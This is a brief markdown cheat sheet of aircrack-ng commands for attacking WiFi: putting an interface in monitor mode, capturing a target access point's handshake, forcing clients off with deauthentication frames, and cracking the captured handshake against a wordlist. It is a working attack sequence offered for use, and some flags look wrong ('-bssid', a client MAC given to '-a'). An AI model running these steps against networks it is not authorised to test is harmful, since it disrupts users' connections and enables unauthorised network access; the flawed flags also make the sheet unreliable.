# Wifi

## aircrack-ng
```console
airmon-ng start [WIRELESS INTERFACE]
```

Note: The interface name might have changed to [WIRELESS INTERFACE]mon. Example: wlan0mon
```console
airodump-ng [WIRELESS INTERFACE]
```

```console
airodump-ng -bssid [AP MAC ADDRESS] -c [AP CHANNEL] --write [FILENAME].cap [WIRELESS INTERFACE]mon
```

```console
aireplay-ng --deauth 100 -a [CLIENT MAC ADDRESS] [WIRELESS INTERFACE]mon
```

```console
aircrack-ng -w [PATH TO WORDLIST].txt [PATH TO HASH FILE].cap
```
